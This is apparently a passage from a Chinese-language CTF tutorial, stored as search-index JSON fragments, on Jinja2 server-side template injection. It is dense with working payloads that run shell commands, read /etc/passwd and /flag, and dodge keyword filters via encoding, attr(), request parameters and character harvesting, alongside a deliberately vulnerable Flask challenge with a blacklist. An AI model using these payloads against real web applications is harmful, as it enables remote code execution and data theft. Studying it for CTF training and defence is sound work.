<p>python\u6709\u4e00\u4e2aimportlib\u7c7b<code>&lt;class '_frozen_importlib.BuiltinImporter'&gt;</code>\uff0c\u53ef\u7528load_module\u6765\u5bfc\u5165\u4f60\u9700\u8981\u7684\u6a21\u5757\u3002</p> <p>\u76ee\u7684\u5c31\u662f\u63d0\u4f9b Python \u4e2d import \u8bed\u53e5\u7684\u5b9e\u73b0,\u4ee5\u53ca\u63d0\u4f9b <code>__import__</code> \u51fd\u6570</p> <p>\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u8be5\u7c7b\u4e2d\u7684<code>load_module</code>\u5c06os\u6a21\u5757\u5bfc\u5165\uff0c\u4ece\u800c\u4f7f\u7528 os \u6a21\u5757\u6267\u884c\u547d\u4ee4\u3002</p> <p>\u9996\u5148\u67e5\u627e\u76ee\u6807Python\u73af\u5883\u4e2d importlib \u7c7b\u7684\u7d22\u5f15\u53f7</p> <pre><code>{{[].__class__.__base__.__subclasses__()[69][\"load_module\"](\"os\")[\"popen\"](\"ls /\").read()}}\n</code></pre> <p>subprocess.Popen \u7c7b\u6267\u884c\u547d\u4ee4</p> <p>\u53ef\u4ee5\u7528 subprocess \u8fd9\u4e2a\u6a21\u5757\u6765\u4ea7\u751f\u5b50\u8fdb\u7a0b\uff0c\u5e76\u8fde\u63a5\u5230\u5b50\u8fdb\u7a0b\u7684\u6807\u51c6\u8f93\u5165/\u8f93\u51fa/\u9519\u8bef\u4e2d\u53bb\uff0c\u8fd8\u53ef\u4ee5\u5f97\u5230\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u3002</p> <p>subprocess \u610f\u5728\u66ff\u4ee3\u5176\u4ed6\u51e0\u4e2a\u8001\u7684\u6a21\u5757\u6216\u8005\u51fd\u6570\uff0c\u6bd4\u5982\uff1a<code>os.system</code>\u3001<code>os.popen</code> \u7b49\u51fd\u6570\u3002</p> <p>\u67e5\u627esubprocess\u7d22\u5f15</p> <pre><code>{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}  \n</code></pre> <p>linecache \u51fd\u6570\u6267\u884c\u547d\u4ee4</p> <p>linecache \u8fd9\u4e2a\u51fd\u6570\u53ef\u7528\u4e8e\u8bfb\u53d6\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u7684\u67d0\u4e00\u884c\uff0c\u800c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u4e5f\u5f15\u5165\u4e86 os \u6a21\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a linecache \u51fd\u6570\u53bb\u6267\u884c\u547d\u4ee4\u3002</p> <p>\u9996\u5148\u67e5\u627e\u542b\u6709 linecache \u8fd9\u4e2a\u51fd\u6570\u7684\u5b50\u7c7b\u7684\u7d22\u5f15\u53f7</p> <pre><code>{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}\n{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#bypass","title":"Bypass","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_5","title":"\u5173\u952e\u5b57\u7ed5\u8fc7","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528<code>+</code>\u8fdb\u884c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57\u8fc7\u6ee4</p> <pre><code>{{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}\n</code></pre> <p>\u5229\u7528\u7f16\u7801\u7ed5\u8fc7</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#base64","title":"base64\u7f16\u7801","text":"<pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#unicode","title":"\u5229\u7528Unicode\u7f16\u7801","text":"<pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f']['\\u0065\\u0076\\u0061\\u006c']('__import__(\"os\").popen(\"ls /\").read()')}}\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\\u006f\\u0073'].popen('\\u006c\\u0073\\u0020\\u002f').read()}}\n</code></pre> <p>\u7b49\u540c\u4e8e</p> <pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}}\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#hex","title":"\u5229\u7528Hex\u7f16\u7801\u7ed5\u8fc7\u5173\u952e\u5b57","text":"<p>\u548c\u4e0a\u9762\u90a3\u4e2a\u4e00\u6837\uff0c\u53ea\u4e0d\u8fc7\u5c06Unicode\u7f16\u7801\u6362\u6210\u4e86Hex\u7f16\u7801\uff0c\u9002\u7528\u4e8e\u8fc7\u6ee4\u4e86\u201cu\u201d\u7684\u60c5\u51b5\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528hex\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57\u8fc7\u6ee4\uff0c\u4f8b\u5982\uff1a</p> <pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f']['\\x65\\x76\\x61\\x6c']('__import__(\"os\").popen(\"ls /\").read()')}}\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\\x6f\\x73'].popen('\\x6c\\x73\\x20\\x2f').read()}}\n</code></pre> <p>\u7b49\u540c\u4e8e</p> <pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}}\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_6","title":"\u5229\u7528\u5f15\u53f7\u7ed5\u8fc7","text":"<p>\u5982\u4e0b</p> <pre><code>[].__class__.__base__.__subclasses__()[40](\"/fl\"\"ag\").read()\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#join","title":"\u5229\u7528join()\u51fd\u6570\u7ed5\u8fc7","text":"<p>\u4eec\u53ef\u4ee5\u5229\u7528join()\u51fd\u6570\u6765\u7ed5\u8fc7\u5173\u952e\u5b57\u8fc7\u6ee4\u3002\u4f8b\u5982\uff0c\u9898\u76ee\u8fc7\u6ee4\u4e86flag\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u7528\u5982\u4e0b\u65b9\u6cd5\u7ed5\u8fc7\uff1a</p> <pre><code>[].__class__.__base__.__subclasses__()[40](\"fla\".join(\"/g\")).read()\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_7","title":"\u4e2d\u62ec\u53f7[ ]","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#getitem","title":"getitem()","text":"<p>\u53ef\u4ee5\u4f7f\u7528 <code>__getitem__()</code> \u65b9\u6cd5\u8f93\u51fa\u5e8f\u5217\u5c5e\u6027\u4e2d\u7684\u67d0\u4e2a\u7d22\u5f15\u5904\u7684\u5143\u7d20(\u76f8\u5f53\u4e8e<code>[]</code>)\uff0c\u5982\uff1a</p> <pre><code>&gt;&gt;&gt; \"\".__class__.__mro__[2]\n&lt;type 'object'&gt;\n&gt;&gt;&gt; \"\".__class__.__mro__.__getitem__(2)\n&lt;type 'object'&gt;\n</code></pre> <pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__(\"os\").popen(\"ls /\").read()')}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#pop","title":"pop() \u7ed5\u8fc7","text":"<p><code>pop()\u65b9\u6cd5</code>\u53ef\u4ee5\u8fd4\u56de\u6307\u5b9a\u5e8f\u5217\u5c5e\u6027\u4e2d\u7684\u67d0\u4e2a\u7d22\u5f15\u5904\u7684\u5143\u7d20\u6216\u6307\u5b9a\u5b57\u5178\u5c5e\u6027\u4e2d\u67d0\u4e2a\u952e\u5bf9\u5e94\u7684\u503c\uff0c\u7528\u6cd5\u548c\u4e0a\u9762\u7684<code>__getitem__()</code>\u57fa\u672c\u4e00\u6837\uff0c\u5982\u4e0b\u793a\u4f8b\uff1a</p> <pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__(\"os\").popen(\"ls /\").read()')}}\n</code></pre> <p>pop()\u4f1a\u5220\u9664\u76f8\u5e94\u4f4d\u7f6e\u7684\u503c\u3002\u4e00\u6b21\u6027\u4f7f\u7528</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_8","title":"\u5b57\u5178\u8bfb\u53d6","text":"<p>\u6211\u4eec\u77e5\u9053\u8bbf\u95ee\u5b57\u5178\u91cc\u7684\u503c\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u628a\u76f8\u5e94\u7684\u952e\u653e\u5165\u6211\u4eec\u719f\u6089\u7684\u65b9\u62ec\u53f7 <code>[]</code> \u91cc\u6765\u8bbf\u95ee\uff0c\u53e6\u4e00\u79cd\u5c31\u662f\u7528\u70b9 <code>.</code> \u6765\u8bbf\u95ee\u3002\u6240\u4ee5\uff0c\u5f53\u65b9\u62ec\u53f7 <code>[]</code> \u88ab\u8fc7\u6ee4\u4e4b\u540e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u7528\u70b9 <code>.</code> \u7684\u65b9\u5f0f\u6765\u8bbf\u95ee\uff0c\u5982\u4e0b\u793a\u4f8b</p> <pre><code>#\u6539\u6210 __builtins__.eval()\n\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls /\").read()')}}\n</code></pre> <p>\u7b49\u540c\u4e8e\uff1a</p> <pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} \n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_9","title":"\u5f15\u53f7","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#chr","title":"\u5229\u7528chr()\u7ed5\u8fc7","text":"<p>\u5148\u83b7\u53d6<code>chr()</code>\u51fd\u6570\uff0c\u8d4b\u503c\u7ed9chr\uff0c\u540e\u9762\u518d\u62fc\u63a5\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32</p> <pre><code>{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}\n</code></pre> <p>\u7b49\u540c\u4e8e\uff1a</p> <pre><code>{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#request","title":"request\u5bf9\u8c61","text":"<pre><code>{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd\n\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&amp;os=os&amp;cmd=ls /\n</code></pre> <p>\u7b49\u540c\u4e8e\uff1a</p> <pre><code>{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}\n</code></pre> <p>\u5982\u679c\u8fc7\u6ee4\u4e86<code>args</code>\uff0c\u53ef\u4ee5\u5c06\u5176\u4e2d\u7684<code>request.args</code>\u6539\u4e3a<code>request.values</code>\uff0cPOST\u548cGET\u4e24\u79cd\u65b9\u6cd5\u4f20\u9012\u7684\u6570\u636e<code>request.values</code>\u90fd\u53ef\u4ee5\u63a5\u6536\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#__","title":"\u4e0b\u5212\u7ebf__","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#request_1","title":"request\u5bf9\u8c61","text":"<p>\u548c\u4e0a\u9762\u4e00\u6837\uff0c\u6211\u4eec\u8fd9\u91cc\u5229\u7528request\u7ed5\u8fc7</p> <pre><code>{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__\n{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__ \n</code></pre> <p>\u7b49\u540c\u4e8e\uff1a</p> <pre><code>{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}\n\n{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_10","title":"\u70b9 .","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#attr","title":"\u5229\u7528 |attr() \u7ed5\u8fc7","text":"<p>\u7528\u539f\u751fJinJa2\u51fd\u6570<code>attr()</code>,\u5f53\u7136\u8fd9\u6837\u53ea\u9002\u7528jinja2</p> <pre><code>().__class__   \u76f8\u5f53\u4e8e  ()|attr(\"__class__\")\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(77)|attr(\"__init__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"os\")|attr(\"popen\")(\"ls /\")|attr(\"read\")()}}\n</code></pre> <p>\u7b49\u540c\u4e8e\uff1a</p> <pre><code>{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}\n</code></pre> <p>\u5176\u5b9e\u8fd9\u4e2a\u51fd\u6570\u662f\u4e00\u4e2a <code>attr()</code> \u8fc7\u6ee4\u5668\uff0c\u5b83\u53ea\u67e5\u627e\u5c5e\u6027\uff0c\u83b7\u53d6\u5e76\u8fd4\u56de\u5bf9\u8c61\u7684\u5c5e\u6027\u7684\u503c\uff0c\u8fc7\u6ee4\u5668\u4e0e\u53d8\u91cf\u7528\u7ba1\u9053\u7b26\u53f7\uff08 <code>|</code> \uff09\u5206\u5272\uff0c\u5b83\u4e0d\u6b62\u53ef\u4ee5\u7ed5\u8fc7\u70b9\u3002</p> <p><code>|attr()</code> \u914d\u5408\u5176\u4ed6\u59ff\u52bf\u53ef\u540c\u65f6\u7ed5\u8fc7\u53cc\u4e0b\u5212\u7ebf <code>__</code> \u3001\u5f15\u53f7\u3001\u70b9 <code>.</code> \u548c <code>[</code> \u7b49\u3002</p> <p>\u8fd9\u91cc\u7684<code>|attr()</code>\u5176\u5b9e\u662fJinJa \u7684\u8fc7\u6ee4\u5668</p> <p>\u53d8\u91cf\u53ef\u4ee5\u901a\u8fc7\u8fc7\u6ee4\u5668\u8fdb\u884c\u4fee\u6539\uff0c\u8fc7\u6ee4\u5668\u4e0e\u53d8\u91cf\u4e4b\u95f4\u7528\u7ba1\u9053\u7b26\u53f7\uff08|\uff09\u9694\u5f00\uff0c\u62ec\u53f7\u4e2d\u53ef\u4ee5\u6709\u53ef\u9009\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u6ca1\u6709\u53c2\u6570\uff0c\u8fc7\u6ee4\u5668\u51fd\u6570\u53ef\u4ee5\u5e26\u62ec\u53f7\u4e5f\u53ef\u4ee5\u4e0d\u5e26\u62ec\u53f7\u3002\u53ef\u4ee5\u4f7f\u7528\u7ba1\u9053\u7b26\u53f7\uff08|\uff09\u8fde\u63a5\u591a\u4e2a\u8fc7\u6ee4\u5668\uff0c\u4e00\u4e2a\u8fc7\u6ee4\u5668\u7684\u8f93\u51fa\u5e94\u7528\u4e8e\u4e0b\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002</p> <p>\u8fc7\u6ee4\u5668\u8be6\u60c5</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_11","title":"\u5229\u7528\u4e2d\u62ec\u53f7[ ]\u7ed5\u8fc7","text":"<p>\u4e2d\u62ec\u53f7\u76f4\u63a5\u62fc\u63a5\u5c31\u53ef\u4ee5\uff0c\u4e0d\u9700\u8981\u7528\u5230<code>.</code></p> <p>\u5982\u4e0b\u793a\u4f8b\uff1a</p> <pre><code>{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()')}}\n</code></pre> <p>\u7b49\u540c\u4e8e\uff1a</p> <pre><code>{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__(\"os\").popen(\"ls /\").read()')}}\n</code></pre> <p>\u8fd9\u6837\u64cd\u4f5c\u540e\u51e0\u4e4e\u6240\u6709\u7684\u5173\u952e\u5b57\u90fd\u6210\u4e86\u5b57\u7b26\u4e32\uff0c\u5c31\u53ef\u4ee5\u7528\u4e0a\u9762\u7f16\u7801\u7684\u65b9\u5f0f\uff08\u6bd4\u5982hex\uff09\uff0c\u7ed5\u8fc7\u5168\u90e8\u7684\u8fc7\u6ee4\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#bypass_1","title":"\u8fc7\u6ee4\u5668bypass","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_12","title":"\u5e38\u7528\u5b57\u7b26\u83b7\u53d6\u5165\u53e3\u70b9","text":"<p>\u83b7\u53d6\u4e00\u822c\u5b57\u7b26\u7684\u65b9\u6cd5\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> <pre><code>{% set org = ({ }|select()|string()) %}{{org}} {% set org = (self|string()) %}{{org}} {% set org = self|string|urlencode %}{{org}} {% set org = (app.__doc__|string) %}{{org}} \n</code></pre> <p>\u5982\u4e0b\u6f14\u793a\uff1a</p> <pre><code>{% set org = ({ }|select()|string()) %}{{org}}\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>&lt;generator object select_or_reject at 0x7fe339298fc0&gt;</code> \u5b57\u7b26\u4e32\u83b7\u53d6\u7684\u5b57\u7b26\u6709\uff1a\u5c16\u53f7\u3001\u7a7a\u683c\u3001\u4e0b\u5212\u7ebf\uff0c\u4ee5\u53ca\u5404\u79cd\u5b57\u6bcd\u548c\u6570\u5b57\u3002</p> <pre><code>{% set org = (self|string()) %}{{org}}\n</code></pre> <p></p> <p>\u53ef\u4ee5\u901a\u8fc7 <code>&lt;TemplateReference None&gt;</code> \u5b57\u7b26\u4e32\u83b7\u53d6\u7684\u5b57\u7b26\u6709\uff1a\u5c16\u53f7\u3001\u5b57\u6bcd\u548c\u7a7a\u683c\u4ee5\u53ca\u5404\u79cd\u5b57\u6bcd\u3002</p> <pre><code>{% set org = self|string|urlencode %}{{org}}\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u83b7\u5f97\u7684\u5b57\u7b26\u9664\u4e86\u5b57\u6bcd\u4ee5\u5916\u8fd8\u6709\u767e\u5206\u53f7\uff0c\u8fd9\u4e00\u70b9\u6bd4\u8f83\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u767e\u5206\u53f7\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4efb\u610f\u5b57\u7b26\uff08URL\uff09\u3002</p> <pre><code>{% set org = (app.__doc__|string) %}{{org}}\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u53ef\u83b7\u5f97\u5230\u7684\u5b57\u7b26\u66f4\u591a\u4e86\uff0c\u6709\u7b49\u53f7\u3001\u52a0\u53f7\u3001\u5355\u5f15\u53f7\u7b49\u3002</p> <ul> <li>\u5bf9\u4e8e\u83b7\u53d6\u6570\u5b57\uff0c\u9664\u4e86\u4e0a\u9762\u51fa\u73b0\u7684\u90a3\u51e0\u79cd\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u6cd5\uff1a</li> </ul> <pre><code>{% set num = (self|int) %}{{num}}    # 0, \u901a\u8fc7int\u8fc7\u6ee4\u5668\u83b7\u53d6\u6570\u5b57\n{% set num = (self|string|length) %}{{num}}    # 24, \u901a\u8fc7length\u8fc7\u6ee4\u5668\u83b7\u53d6\u6570\u5b57\n{% set point = self|float|string|min %}    # \u901a\u8fc7float\u8fc7\u6ee4\u5668\u83b7\u53d6\u70b9 .\n</code></pre> <p>\u6709\u4e86\u6570\u5b570\u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u4f9d\u6b21\u5c06\u5176\u4f59\u7684\u6570\u5b57\u5168\u90e8\u6784\u9020\u51fa\u6765\uff0c\u539f\u7406\u5c31\u662f\u52a0\u51cf\u4e58\u9664\u3001\u5e73\u65b9\u7b49\u6570\u5b66\u8fd0\u7b97\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#_13","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\u6e90\u7801\uff1a</p> <pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    def safe_jinja(s):\n        blacklist = ['class', 'attr', 'mro', 'base',\n                     'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\\'', '\"', '{}']\n        flag = True\n        for no in blacklist:\n            if no.lower() in s.lower():\n                flag = False\n                break\n        return flag\n    if not request.args.get('name'):\n        return open(__file__).read()\n    elif safe_jinja(request.args.get('name')):\n        name = request.args.get('name')\n    else:\n        name = 'wendell'\n    template = '''\n\n    &lt;div class=\"center-content\"&gt;\n        &lt;p&gt;Hello, %s&lt;/p&gt;\n    &lt;/div&gt;\n    &lt;!--flag in /flag--&gt;\n    &lt;!--python3.8--&gt;\n''' % (name)\n    return render_template_string(template)\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=5000)\n</code></pre> <p>\u5728\u5b58\u5728ssti\u7684\u5730\u65b9\u6267\u884c\u5982\u4e0bpayload\uff1a</p> <pre><code>{% set org = ({ }|select()|string()) %}{{org}}\n# \u6216 {% set org = ({ }|select|string) %}{{org}}\n</code></pre> <p>\u5f97\u5230\u4e86\u4e00\u6bb5\u5b57\u7b26\u4e32\uff1a<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code></p> <p>\u8fd9\u6bb5\u5b57\u7b26\u4e32\u4e2d\u4e0d\u4ec5\u5b58\u5728\u5b57\u7b26\uff0c\u8fd8\u5b58\u5728\u7a7a\u683c\u3001\u4e0b\u5212\u7ebf\uff0c\u5c16\u53f7\u548c\u6570\u5b57\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u9898\u76ee\u8fc7\u6ee4\u4e86\u8fd9\u4e9b\u5b57\u7b26\u7684\u8bdd\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5728 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> \u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e2d\u53d6\u5230\u6211\u4eec\u60f3\u8981\u7684\u5b57\u7b26\uff0c\u4ece\u800c\u7ed5\u8fc7\u8fc7\u6ee4\u3002</p> <p>\u518d\u4f7f\u7528<code>list()</code>\u8fc7\u6ee4\u5668\u5c06\u5b57\u7b26\u4e32\u8f6c\u5316\u4e3a\u5217\u8868\uff1a</p> <pre><code>{% set orglst = ({ }|select|string|list) %}{{orglst}\n</code></pre> <p>\u8fd4\u56de\u5217\u8868\u4e2d\u662f </p> <pre><code>['&lt;', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a\n', 't', ' ', '0', 'x', '7', 'f', '0', '6', '7', '7', '1', 'f', '4', '1', '5', '0', '&gt;']                \n</code></pre> <p>\u4f7f\u7528pop()\u7b49\u65b9\u6cd5\u5c06\u5217\u8868\u91cc\u7684\u5b57\u7b26\u53d6\u51fa\u6765\u3002\u5982\u4e0b\u6240\u793a\uff0c\u53d6\u4e00\u4e2a\u4e0b\u5212\u7ebf <code>_</code>\uff1a</p> <pre><code>{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _\n</code></pre> <p>\u540c\u7406\u8fd8\u80fd\u53d6\u5230\u66f4\u591a\u7684\u5b57\u7b26\uff1a</p> <pre><code>{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # \u7a7a\u683c\n{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _\n{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0\n{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7\n......\n</code></pre> <p>\u8fd9\u91cc\uff0c\u5176\u5b9e\u6709\u4e86\u6570\u5b570\u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u4f9d\u6b21\u5c06\u5176\u4f59\u7684\u6570\u5b57\u5168\u90e8\u6784\u9020\u51fa\u6765\uff0c\u539f\u7406\u5c31\u662f\u52a0\u51cf\u4e58\u9664\u3001\u5e73\u65b9\u7b49\u6570\u5b66\u8fd0\u7b97\uff0c\u5982\u4e0b\u793a\u4f8b\uff1a</p> <pre><code>{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0\n{% set one = (zero**zero)|int %}{{one}}    # 1\n{%set two = (zero-one-one)|abs %}    # 2\n{%set three = (zero-one-one-one)|abs %}    # 3\n{% set five = (two*two*two)-one-one-one %}    # 5\n#  {%set four = (one+three) %}    \n......\n</code></pre> 